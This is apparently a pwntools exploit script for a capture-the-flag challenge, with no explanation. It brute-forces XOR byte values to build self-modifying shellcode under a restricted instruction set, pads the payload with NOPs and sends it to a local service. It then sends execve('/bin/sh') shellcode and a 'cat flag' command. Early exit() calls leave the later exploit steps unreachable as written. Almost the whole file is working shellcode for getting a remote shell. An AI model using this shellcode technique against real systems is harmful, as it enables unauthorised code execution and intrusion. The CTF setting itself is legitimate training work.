from pwn import *
from binascii import hexlify
context.arch = 'amd64'
#push rdx   52 
#pop  rsi   5e 
#pop  rdx   5a 
#pop  rcx   59 
syscall_start=asm('syscall')[0]
for i in range(0x69,0x70):
	if i^0x52 > i^0x5e > i^0x5a > syscall_start:
		for j in range(syscall_start, 0x70 ):
			da = disasm(chr(i^j).encode())
			if i^0x5a > j:
				print(hex(i) , hex(i^0x52) , hex(i^0x5e) , hex(i^0x5a) , hex(j) , da)
exit()
# print(disasm(b'\x24'))
exit()
a = asm("""
		pushf
		xor dword ptr [rdx+0x70], 0x69696969
		.byte 0x3b
		.byte 0x37
		.byte 0x33
		.byte 0xf
		syscall
		""")

padding = 0x76 - len(a) 
a = a+b'\x90' * padding
# r = remote("csie.ctf.tw","10121")
r = remote("127.0.0.1","8888")
r.send(a)

a=a+asm("""
		mov rdi,0x0068732F6E69622F
		push rdi
		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		mov rax, 0x3b
		syscall
		""")
r.send(a)
r.send("cat flag\n")
print(r.recv().decode())